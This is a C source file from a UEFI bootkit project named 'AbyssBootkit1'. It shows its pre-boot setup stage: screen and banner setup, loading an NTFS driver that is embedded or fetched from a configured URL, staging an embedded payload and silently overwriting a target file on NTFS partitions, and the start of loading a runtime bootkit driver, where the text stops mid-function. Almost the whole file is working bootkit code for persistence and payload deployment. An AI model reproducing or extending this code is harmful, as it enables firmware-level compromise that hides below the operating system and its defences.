// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Set Up
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>
#include <Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils00Screen.h>
#include <Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils01Banner.h>
#include <Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils02Files.h>
#include <Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils03Http.h>
#include <Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils04Ntfs.h>



// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------
// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot1_Setup/Payloads/Payloads01DefaultNtfsDriver.h>
#include <Modules/Module0_PreBoot1_Setup/Payloads/Payloads02AdditionalComponents.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Configure the screen settings based on the global screen configuration value.
	@details        This function checks if the global screen configuration value, `Global_PreBootConfiguration_FunctionsConfiguration_Screen`, is set to the string "TRUE". If it is, the function configures the console output to the highest resolution.


	@retval         EFI_SUCCESS             The function completed successfully, and the screen configuration has been set.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_Screen()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the Screen field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - Check if the Screen field is TRUE\r\n");

	//PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - Global_PreBootConfiguration_FunctionsConfiguration_Screen value: %s", Global_PreBootConfiguration_FunctionsConfiguration_Screen);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_Screen, L"TRUE") == 0)
	{
		// Set the console output to the highest resolution
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - Set the console output to the highest resolution\r\n");
		UtilsScreen_SetConsoleOutputToHighestResolution();
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_Screen] not TRUE.\r\n");
	}

	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureScreen) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Configures the display banner based on global banner configuration values.
	@details        This function checks multiple global configuration fields related to banner display. If the `Global_PreBootConfiguration_FunctionsConfiguration_Banner` field is set to "TRUE", the function proceeds to check other banner configuration fields. Depending on the values of these fields, it displays the appropriate banner content.


	@retval         EFI_SUCCESS             The function completed successfully and the banner was configured and displayed as specified.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_Banner()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_GRAPHICS_OUTPUT_PROTOCOL *GraphicsOutput;


	// ---------------------------------------------------------------------------------------------------------------------
	// Locate the Graphics Output protocol

	// Returns the first protocol instance that matches the given protocol.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-locateprotocol
	Status = gBS->LocateProtocol(&gEfiGraphicsOutputProtocolGuid, NULL, (VOID**)&GraphicsOutput);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - gBS->LocateProtocol [gEfiGraphicsOutputProtocolGuid] failed: %r (%llx).\r\n", Status, Status);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the Banner field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Check if the Banner field is TRUE\r\n");

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_Banner, L"TRUE") == 0)
	{

		// If Banner is TRUE, proceed to check image fields
		// Display the appropriate banner image based on the configuration


		// Check if the BannerImageAbyssSquid field is TRUE
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Check if the BannerImageAbyssSquid field is TRUE\r\n");

		// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
		if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid, L"TRUE") == 0)
		{
			// AbyssSquid
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - AbyssSquid\r\n");
			Status = PreBootSetup_UtilsBanner_PrintBannerBmp(GraphicsOutput, 1);

			// Failed
			if (EFI_ERROR(Status))
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - PreBootSetup_UtilsBanner_PrintBannerBmp [1] failed: %r (%llx).\r\n", Status, Status);
				return Status;
			}
		}
		else
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BannerImageAbyssSquid] failed.\r\n");


			// Check if the BannerImageSquid field is TRUE
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Check if the BannerImageSquid field is TRUE\r\n");
			
			// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
			// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
			if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid, L"TRUE") == 0)
			{
				// Squid
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Squid\r\n");
				Status = PreBootSetup_UtilsBanner_PrintBannerBmp(GraphicsOutput, 2);

				// Failed
				if (EFI_ERROR(Status))
				{
					PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - PreBootSetup_UtilsBanner_PrintBannerBmp [2] failed: %r (%llx).\r\n", Status, Status);
					return Status;
				}
			}
			else
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BannerImageSquid] not TRUE.\r\n");

				// Check if the BannerAscii field is TRUE
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Check if the BannerAscii field is TRUE\r\n");

				// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
				// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
				if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii, L"TRUE") == 0)
				{
					// Ascii
					PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Ascii\r\n");
					PreBootSetup_UtilsBanner_PrintBannerAscii();
				}
				else
				{
					PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BannerAscii] not TRUE.\r\n");
				}
			}
		}
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_Banner] not TRUE.\r\n");
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (ConfigureBanner) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Loads a UEFI NTFS driver to enable read/write access to NTFS partitions.
	@details        Depending on the configuration, this function either writes an embedded NTFS read/write driver to disk or downloads it from a remote server. It then attempts to load the driver image into memory so that NTFS volumes can be accessed with write permissions during UEFI execution.


	@retval         EFI_SUCCESS         Driver was successfully loaded or feature was disabled.
	@retval         Others              Failed to write, download, or load the NTFS driver.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_UEFIReadWriteNTFSDriver()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_HANDLE FileImageHandle = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the UEFIReadWriteNTFSDriver field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Check if the UEFIReadWriteNTFSDriver field is TRUE\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver, L"TRUE") == 0)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Check if the UEFIReadWriteNTFSDriverDownload field is TRUE
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload);

		// Option A: Download the driver
		if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverDownload, L"TRUE") == 0)
		{
			// -------------------------------------------------------------------------------------------------------------
			// Download file
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Download driver from URL [%s] to path %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL, Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);

			// Download
			Status = PreBootSetup_UtilsHttp_DownloadFile(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverURL, Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);

			// Failed
			if (EFI_ERROR(Status))
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - PreBootSetup_UtilsHttp_DownloadFile failed: %r (%llx).\r\n", Status, Status);
				return Status;
			}

			// Successfully download and wrote UEFI Read/Write NTFS Driver to path
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Successfully downloaded and wrote UEFI Read/Write NTFS Driver to path %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);
		}
		// Option B: Use embedded payload
		else
		{
			// -------------------------------------------------------------------------------------------------------------
			// Write the UEFI Read/Write NTFS Driver to the specified path
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Write the UEFI Read/Write NTFS Driver to the specified path: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);

			// Write binary file to path
			Status = PreBootSetup_UtilsFiles_WriteBinaryFile(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath, Global_PreBootSetup_PayloadsNtfsDriver_Ntfs3g, sizeof(Global_PreBootSetup_PayloadsNtfsDriver_Ntfs3g));

			// Failed
			if (EFI_ERROR(Status))
			{
				PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - PreBootSetup_UtilsFiles_WriteBinaryFile failed: %r (%llx).\r\n", Status, Status);
				return Status;
			}

			// Successfully wrote UEFI Read/Write NTFS Driver to path
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Successfully wrote UEFI Read/Write NTFS Driver to path: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath);
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Load the UEFI Read/Write NTFS Driver into memory
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Load the UEFI Read/Write NTFS Driver into memory\r\n");

		// Load image file into memory
		Status = PreBootSetup_UtilsFiles_LoadImageFileIntoMemory(Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriverPath, &FileImageHandle);

		// Failed
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - PreBootSetup_UtilsFiles_LoadImageFileIntoMemory failed: %r (%llx).\r\n", Status, Status);
			return Status;
		}

		// Successfully loaded UEFI Read/Write NTFS Driver into memory
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Successfully loaded UEFI Read/Write NTFS Driver into memory\r\n");

	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_UEFIReadWriteNTFSDriver] not TRUE.\r\n");
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (UEFIReadWriteNTFSDriver) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Deploys an additional binary component to disk.
	@details        This function writes the embedded component (kernel-mode driver, console application, ...) to the ESP under a temporary path. It then refreshes the filesystem mappings, scans each for the configured destination path, and if found, silently overwrites the target file. Before overwriting, it creates a backup of the original if one does not already exist.


	@retval         EFI_SUCCESS         The payload was successfully deployed to at least one partition.
	@retval         EFI_NOT_FOUND       The target file was not found on any scanned partition.
	@retval         Others              An error occurred while staging, remapping, or copying the payload.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_AdditionalComponentDisk()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status; 
	BOOLEAN DidCopy = FALSE;
	CONST CHAR16 *StagePath = L"\\EFI\\Boot\\AdditionalComponent.bin";


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the AdditionalComponentDisk field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Check if the AdditionalComponentDisk field is TRUE\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent, L"TRUE") == 0)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Stage the payload in the ESP
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Stage the payload in the ESP\r\n");


		Status = PreBootSetup_UtilsFiles_WriteBinaryFile((CHAR16 *)StagePath, (CONST VOID *)Global_PreBootSetup_PayloadsAdditionalComponents_UserModeApplication, sizeof(Global_PreBootSetup_PayloadsAdditionalComponents_UserModeApplication));

		// Failed
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - PreBootSetup_UtilsFiles_WriteBinaryFile failed: %r (%llx).\r\n", Status, Status);
			return Status;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Remap partitions
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Remap partitions\r\n");

		Status = PreBootSetup_UtilsNtfs_RemapPartitions();

		// Failed
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - PreBootSetup_UtilsNtfs_RemapPartitions failed: %r (%llx).\r\n", Status, Status);
			return Status;
		}

		// Purely informational
		//PreBootSetup_UtilsNtfs_ListPartitions();


		// -----------------------------------------------------------------------------------------------------------------
		// Copy the staged payload and create the backup
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Copy the staged payload and create the backup\r\n");

		Status = PreBootSetup_UtilsNtfs_CopyStageToTargets(StagePath, Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponentPath, &DidCopy);


		// -----------------------------------------------------------------------------------------------------------------
		// Summary
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - PreBootSetup_UtilsNtfs_CopyStageToTargets failed: %r (%llx).\r\n", Status, Status);
		}
		else if (DidCopy)
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Payload deployed on at least one partition\r\n");
		}
		else
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Payload was not copied to any partition\r\n");
		}
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_AdditionalComponent] not TRUE.\r\n");
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (AdditionalComponentDisk) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return Status;
}



/**
	@brief          Stages and loads the runtime bootkit (DXE Runtime Driver) into memory.
	@details        This function writes the embedded runtime bootkit image to the ESP under the configured path and then loads the image into memory (ready for execution at runtime).


	@retval         EFI_SUCCESS         Bootkit successfully loaded or feature disabled.
	@retval         Others              Failed to write or load the bootkit image.
**/
EFI_STATUS
PreBootSetup_FunctionsSetup_BootkitRuntime()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	EFI_HANDLE BootkitImageHandle = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the BootkitRuntime field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Check if the BootkitRuntime field is TRUE\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> PreBootSetup [Functions/Setup.c] (BootkitRuntime) - Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BootkitRuntime, L"TRUE") == 0)
	{
